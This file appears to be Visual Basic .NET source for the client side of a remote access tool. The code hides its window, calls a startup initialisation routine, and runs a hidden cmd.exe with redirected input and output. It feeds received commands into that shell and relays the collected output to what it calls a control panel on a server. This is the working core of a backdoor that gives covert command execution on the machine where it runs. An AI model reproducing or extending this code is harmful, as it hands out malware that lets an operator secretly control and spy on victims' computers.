Public Class Main
    Dim strResults As String
    Dim ResultadoComando As String
    Dim canSend As Boolean = False
    Dim swWriter As System.IO.StreamWriter
    Dim thrdCMD As System.Threading.Thread
    Dim thrdCMDResponse As System.Threading.Thread
    Private Delegate Sub Update()
    Dim uFin As New Update(AddressOf UpdateText)

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        CheckForIllegalCrossThreadCalls = False
        parameters = Command()
        StartUp.Init()
        ReadParameters(parameters)
        AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEvent
    End Sub

    Sub SessionEvent(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
        Try
            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
                AddToLog("SessionEvent", "User is logging off!", True)
            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
                AddToLog("SessionEvent", "System is shutting down!", True)
            Else
                AddToLog("SessionEvent", "Something happend!", True)
            End If
        Catch ex As Exception
            AddToLog("SessionEvent@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Sub StartTheInstance()
        Try
            thrdCMD = New System.Threading.Thread(AddressOf Prompt)
            thrdCMD.IsBackground = True
            thrdCMD.Start()
        Catch ex As Exception
            AddToLog("StartTheInstance@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StopTheInstance()
        Try
            swWriter.Close()
            thrdCMD.Abort()
        Catch ex As Exception
            AddToLog("StopTheInstance@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Sub ProcessCommand(ByVal argumentLine As String)
        Try
            Dim cmdToSend = argumentLine
            swWriter.WriteLine(cmdToSend & Environment.NewLine)
            canSend = True
            thrdCMDResponse = New System.Threading.Thread(AddressOf WaitForSendingCommandToControlPanelInServerConnectionThreadJajajajajaSaludos)
            thrdCMDResponse.IsBackground = True
            thrdCMDResponse.Start()
        Catch ex As Exception
            AddToLog("ProcessCommand@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Sub WaitForSendingCommandToControlPanelInServerConnectionThreadJajajajajaSaludos()
        Try
            Threading.Thread.Sleep(10000)
            BoroHearSendContent(My.Application.Info.AssemblyName & " [Versión " & My.Application.Info.Version.ToString & "] " & vbCrLf & ResultadoComando)
            canSend = False
            ResultadoComando = Nothing
            strResults = Nothing
        Catch
        End Try
        Try
            thrdCMDResponse.Abort()
        Catch
        End Try
    End Sub

    Private Sub Prompt()
        Dim procCMDWin As New Process
        AddHandler procCMDWin.OutputDataReceived, AddressOf CMDOutput
        procCMDWin.StartInfo.RedirectStandardOutput = True
        procCMDWin.StartInfo.RedirectStandardInput = True
        procCMDWin.StartInfo.CreateNoWindow = True
        procCMDWin.StartInfo.UseShellExecute = False
        procCMDWin.StartInfo.FileName = "cmd.exe"
        procCMDWin.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
        procCMDWin.Start()
        procCMDWin.BeginOutputReadLine()
        swWriter = procCMDWin.StandardInput
        Do Until (procCMDWin.HasExited)
        Loop
        procCMDWin.Dispose()
    End Sub
    Sub UpdateText()
        ResultadoComando &= strResults
        Console.WriteLine(strResults)
    End Sub
    Private Sub CMDOutput(ByVal Sender As Object, ByVal OutputLine As DataReceivedEventArgs)
        strResults = OutputLine.Data & Environment.NewLine
        Invoke(uFin)
    End Sub
End Class